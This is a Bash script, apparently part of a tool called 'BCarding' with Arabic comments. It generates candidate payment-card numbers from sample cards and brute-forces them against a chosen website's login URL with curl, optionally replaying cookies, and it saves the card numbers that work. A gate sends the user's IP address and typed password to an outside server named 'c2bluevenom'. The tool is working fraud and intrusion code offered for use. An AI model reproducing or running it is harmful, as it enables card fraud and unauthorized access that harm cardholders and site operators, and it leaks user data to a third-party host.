        wget --spider --quiet https://github.com
        if [ "$?" = 0 ]; then
                echo -e "${good} Connected to the network [★]"
                return 0
        else
                echo -e "${bad} No Internet connection [X]"
                return 1
        fi
        }

        # Main script
        echo -e ${info} "Example about This Tool : "
        echo -e ""
        echo -e "${blue}https${y}://${p}pan${y}.${r}net${y}/login.php?username=${green}000000000"
        echo
        echo -e "${blue}Blue${y} : protocol"
        echo -e "${p}Purple${y}  : host"
        echo -e "${r}Red${y}     : domain"
        echo -e "${g}green${y}   : *Your Card*"
        echo -e "${y}yeallow${y} : WEBS_FILE" 
        echo
        echo
        echo -e "${ask} Enter the host:"
        echo -e "${info} exampel -> ${w}https://${p}pan${w}.net/login.php?username=0000000000"
        read -p " ()------------:[host]}=> " host

        echo -e "${ask} Enter the protocol (http or https):"
        echo -e "${info} exampel -> ${b}https${w}://pan.net/login.php?username=0000000000"
        read -p " ()------------:[protocol]}=> " protocol

        echo -e "${ask} Enter the domain name:"
        echo -e "${info} exampel -> ${w}https://pan.${r}net${w}/login.php?username=0000000000"
        read -p " ()------------:[domain]}=> " domain

        echo -e "${ask} Enter the web file:"
        echo -e "${info} exampel -> ${w}https://pan.net/${y}login.php${w}?username=0000000000"
        read -p " ()------------:[web_file]}=> " web_file

        if [[ ${save_sussced_files} == "2" ]];then
                skip="false"
        fi

        echo -e "${ask} Do you want to use a ready Wordlist or create a new one?"
        echo -e "${ask} [1] Use ready Wordlist"
        echo -e "${ask} [2] Create a new Wordlist"
        read -p "=)------------<:}=> " wordlist_choice

        if [[ "$wordlist_choice" == "2" ]]; then

                # دالة لتوليد الاحتمالات بناءً على الفروق
                generate_combinations() {
                local card1="$1"
                local card2="$2"
                local length=${#card1}
                local combination=""
                local variable_positions=()

                # فحص الفروقات وتحديد الأرقام الثابتة
                for (( i=0; i<$length; i++ )); do
                        digit1="${card1:i:1}"
                        digit2="${card2:i:1}"

                        if [[ "$digit1" == "$digit2" ]]; then
                        combination+="$digit1"  # الأرقام الثابتة
                        else
                        combination+="x"  # الأماكن المتغيرة
                        variable_positions+=($i)  # حفظ الأماكن المتغيرة
                        fi
                done

                # دالة لتوليد الاحتمالات لجميع الأماكن المتغيرة
                generate_possible_cards() {
                        local current_combination="$1"
                        local index="$2"

                        if [[ "$index" -eq "${#variable_positions[@]}" ]]; then
                        echo "$current_combination"  # طباعة الاحتمال الحالي
                        else
                        local pos="${variable_positions[$index]}"
                        for i in {0..9}; do
                                generate_possible_cards "${current_combination:0:$pos}$i${current_combination:$((pos+1))}" $((index + 1))
                        done
                        fi
                }

                generate_possible_cards "$combination" 0
                }

                # السؤال عن عدد البطاقات
                echo -e ${ask} "How many cards do you want to compare with? (minimum 2)"
                read -p ":--------(cards)>" num_cards

                # التأكد من أن عدد البطاقات صحيح
                if [[ "$num_cards" -lt 2 ]]; then
                        echo -e ${bad} "The number of cards should be at least 2. Please try again"
                        sleep 3.5
                        Mik
                fi

                # قراءة البطاقات من المستخدم
                cards=()
                for ((i=1; i<=num_cards; i++)); do
                echo -e ${info} " put the number : $i"
                read -p "${w}------${g}=${y}------${r}>${w}" card
                cards+=("$card")
                if ((${i} > 10));then
                        echo -e $bad "Out of range !"
                        sleep 3.5
                        Mik
                fi
                done

                # التأكد من أن البطاقات كلها متساوية في الطول
                length=${#cards[0]}
                for card in "${cards[@]}"; do
                if [[ ${#card} -ne $length ]]; then
                        echo -e ${bad} "The cards must be equal in length. Please try again"
                        sleep 3.5
                        Mik
                fi
                done

                # المقارنة بين البطاقة الأولى والثانية
                card1="${cards[0]}"
                card2="${cards[1]}"

                # تحديد الأرقام الثابتة والفروقات بين البطاقتين
                echo -e ${info} "${g} Card1${w} : $card1"
                echo -e ${info} "${g} Card2${w} : $card2"
                if [[ ${ready_wordlist} == "" ]];then
                        ready_wordlist="$(date +blue24bluer_Bcarding_20%y%m%d%H%M%S%s.txt)"
                fi
                # إنشاء ملف الاحتمالات
                echo "" > "$ready_wordlist"  # مسح محتويات الملف إن كان موجودًا سابقًا
                echo -e ${ask} "Put a name of wordlist : "
                read -p ":--------(ready_wordlist)>" ready_wordlist
                if [[ ${ready_wordlist} == "" ]];then
                        ready_wordlist="$(date +blue24bluer_Bcarding_20%y%m%d%H%M%S%s.txt)"
                fi
                # توليد الاحتمالات بناءً على الفروق وكتابتها مباشرة في الملف
                echo -e ${info} "${y}Probability is being ${g}generated...${y} it will be saved in the ${b}$ready_wordlist${y} file.${w}"
                generate_combinations "$card1" "$card2" | while read combination; do
                echo "$combination" >> "$ready_wordlist"  # كتابة كل احتمال فور توليده
                done

                echo -e "The prospects were successfully created in the $ready_wordlist file."
                echo -e "${good} Ready Wordlist selected: $ready_wordlist"
                wordlist=$ready_wordlist

        elif [[ "$wordlist_choice" == "1" ]]; then
                echo -e "${ask} Enter the path of the ready Wordlist:"
                read -p " ()------------:}=> " ready_wordlist
                if [[ -f $ready_wordlist ]];then
                        echo -e "${good} Ready Wordlist selected: $ready_wordlist"
                        wordlist=$ready_wordlist
                else
                        echo -e "${bad} there no file found !"
                        exit 1
                fi
        fi

                echo -e "${ask} Do you want to use cookies while guessing? [y/n]"
                read -p " ()------------:}=> " use_cookies

                echo -e "${ask} Do you want to use the sielnt code ? [y/n]"
                read -p " ()------------:}=> " scot

                echo -e "${ask} Do you want save all successfully cards ? [y/n]"
                read -p " ()------------:}=> " successfully

                sielnt=""
                if [[ ${scot} == [yY] ]];then
                        sielnt="-s"
                fi

                if [[ ${successfully} == [yY] ]];then

                        echo -e ${ask} "Whare You Want to save all successfully cards ?"
                        read -p " ()------------:}=> " su_path
                        if [[ -f ${su_path} ]];then
                                printf ""
                        else
                                echo -e ${red} "You have put a vaild path, anyway the default path is $(pwd)/successfully_card_by_blue24bluer.txt" 
                                su_path="$(pwd)/successfully_card_by_$(date +blue24bluer_Bcarding_20%y%m%d%H%M%S%s.txt)"
                        fi
                fi

                cookie_flag=false
                if [[ "$use_cookies" == "y" ]]; then
                echo -e "${ask} Enter the path of the cookies file:"
                read -p " ()------------:}=> " cookie_file
                cookie_flag=true
                fi

                echo -e "${info} Starting guessing process with Wordlist on ${protocol}://${host}.${domain}..."
                while IFS= read -r card_guess; do
                        echo -e "${info} Guessing with card: $card_guess"

                        if $cookie_flag; then
                                curl -b ${sielnt} "$cookie_file" "$protocol://$host.$domain/$web_file?username=$card_guess"
                        else
                                curl ${sielnt} "$protocol://$host.$domain/$web_file?username=$card_guess"
                        fi

                        sleep 1
                        sed -i "/^${card_guess}$/d" "$wordlist"

                        if check_network; then
                                echo -e "${good} Connected to the internet!"
                                if [[ ${successfully} == [yY] ]];then 
                                
                                        echo -e "Card is running : ${card_guess}" >> ${su_path}
                                        curl -b ${sielnt} "$cookie_file" "$protocol://$host.$domain/logout" 
                                else
                                        break
                                fi
                        else
                                echo -e "${bad} No internet connection. Retrying..."
                        fi

                done < "$wordlist"

                if $cookie_flag; then
                        echo -e "${ask} Do you want to delete the cookies after completion? [y/n]"
                        read -p " (y/n)------------:}=> " delete_cookies

                        if [[ "$delete_cookies" == "y" ]]; then
                                rm "$cookie_file"
                                echo -e "${good} Cookies deleted."
                        else
                                echo -e "${info} Cookies retained."
                        fi
        
                fi
}




# =======================================================
#              Authentication Function
# =======================================================

run_authentication() {

# =======================================================
#               Color & Style Definitions
# =======================================================
# --- Colors ---
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
blue="\033[1;34m"
purple="\033[1;35m"
cyan="\033[1;36m"
white="\033[0;37m"
nc="\033[00m"

# --- Prompt Styles ---
info="${cyan}[${white}+${cyan}] ${yellow}"
ask="${cyan}[${white}?${cyan}] ${purple}"
bad="${cyan}[${white}!${cyan}] ${red}"
good="${cyan}[${white}√${cyan}] ${green}"


    # --- Configuration ---
    local BAN_DURATION=300 # مدة الحظر بالثواني (300 ثانية = 5 دقائق)
    local LOCK_FILE="/tmp/bcarding_auth.lock" # ملف القفل المؤقت للحظر

    # 1. التحقق من وجود حظر مؤقت
    # ---------------------------------
    if [ -f "$LOCK_FILE" ]; then
        local lock_time=$(cat "$LOCK_FILE")
        local current_time=$(date +%s)
        local time_diff=$((current_time - lock_time))

        if [ "$time_diff" -lt "$BAN_DURATION" ]; then
            local remaining_time=$((BAN_DURATION - time_diff))
            echo -e "${bad}You are temporarily banned due to a failed login attempt."
            echo -e "${info}Please try again in ${yellow}$remaining_time ${info}seconds."
            exit 1
        else
            # إذا انتهت مدة الحظر، احذف الملف للسماح بمحاولة جديدة
            rm -f "$LOCK_FILE"
        fi
    fi


    # 2. عرض البانر وشاشة تسجيل الدخول
    # -----------------------------------
    clear
    echo -e "
${b}
${b}░▒▓███████▓▒░  ░▒▓█▓▒░        ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓████████▓▒░  ░▒▓███████▓▒░  ░▒▓██████▓▒░  ░▒▓████████▓▒░ ░▒▓████████▓▒░ ░▒▓███████▓▒░  
${b}░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░        ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░        ░▒▓█▓▒░        ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░        ░▒▓█▓▒░        ░▒▓█▓▒░░▒▓█▓▒░ 
${b}░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░        ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░        ░▒▓█▓▒░        ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░        ░▒▓█▓▒░        ░▒▓█▓▒░░▒▓█▓▒░ 
${b}░▒▓███████▓▒░  ░▒▓█▓▒░        ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓██████▓▒░    ░▒▓██████▓▒░  ░▒▓████████▓▒░ ░▒▓██████▓▒░   ░▒▓██████▓▒░   ░▒▓███████▓▒░  
${b}░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░        ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░               ░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░        ░▒▓█▓▒░        ░▒▓█▓▒░░▒▓█▓▒░ 
${b}░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░        ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░               ░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░        ░▒▓█▓▒░        ░▒▓█▓▒░░▒▓█▓▒░ 
${b}░▒▓███████▓▒░  ░▒▓████████▓▒░  ░▒▓██████▓▒░  ░▒▓████████▓▒░ ░▒▓███████▓▒░  ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░        ░▒▓████████▓▒░ ░▒▓█▓▒░░▒▓█▓▒░"
    echo -e "${c}├───────────────────────────────────────────────────────────────┤"
    echo -e "│               ${white}Secure Admin Panel Authentication               ${c}│"
    echo -e "└───────────────────────────────────────────────────────────────┘${nc}"
        echo -e ${info} $blue "by @blue24bluer"

    # 3. قراءة كلمة المرور والتحقق منها
    # -----------------------------------
    read -s -p "    └──> Password: " passw
    echo "" # لإضافة سطر جديد بعد إدخال كلمة المرور

    # إظهار رسالة تحقق للمستخدم
    echo -e "\n${info}Verifying credentials, please wait..."

    # الحصول على IP وإرسال الطلب
    local ip_addr=$(curl -s ifconfig.me)
    if [ -z "$ip_addr" ]; then
        echo -e "${bad}Could not retrieve IP address. Please check your internet connection."
        exit 1
    fi
    
    local CAF=$(curl -s -L "https://c2bluevenom.netlify.app/safe_mode?ip=${ip_addr}&tool_name=bcarding&password=${passw}")

    # 4. معالجة نتيجة التحقق
    # --------------------------------
    if [[ "$CAF" == "true" ]]; then
        echo -e "${good}Authentication successful. Welcome!"
        save_new_data bcarding_access "true"
        sleep 1
        # السكربت سيكمل من هنا
        return 0 # إرجاع رمز النجاح
    elif [[ "$CAF" == "false" ]]; then
        echo -e "${bad}Authentication failed. Incorrect password."
        # إنشاء ملف الحظر المؤقت
        date +%s > "$LOCK_FILE"
        echo -e "${info}You have been banned for ${yellow}$((BAN_DURATION / 60)) ${info}minutes."
        exit 1 # الخروج من السكربت بالكامل
    else
        echo -e "${bad}An error occurred. Could not connect to authentication server."
        echo -e "${info}Server response: ${yellow}${CAF:-'No Response'}"
        exit 1 # الخروج من السكربت بالكامل
    fi
}


# =======================================================
#               Main Script Execution
# =======================================================

# أولاً، يتم استدعاء دالة التحقق
succes=$(get_new_data bcarding_access)
if [[ ${succes} == "true" ]];then
        clear
        echo -e "${good}Welcome to the BCarding Tool main interface!"
        #
        # >>> ضع بقية كود الأداة بالكامل هنا <<<
        # مثال:
        VIP=true
        safe_mode=true
        # save_new_data safe_mode_allinone "true" # ربما تريد تغيير هذا؟
        
        echo "You can now use the tool."
        bcarding
else
        if run_authentication; then
        # إذا نجح التحقق (الدالة أرجعت 0)، سيتم تنفيذ هذا الجزء
        clear
        echo -e "${good}Welcome to the BCarding Tool main interface!"
        #
        # >>> ضع بقية كود الأداة بالكامل هنا <<<
        # مثال:
        VIP=true
        safe_mode=true
        # save_new_data safe_mode_allinone "true" # ربما تريد تغيير هذا؟
        
        echo "You can now use the tool."
        bcarding
        else
        # هذا الجزء لن يتم الوصول إليه في العادة لأن الدالة تخرج من السكربت عند الفشل
        # لكنه موجود كممارسة جيدة
        echo -e "${bad}Authentication process was terminated."
        exit 1
        fi
fi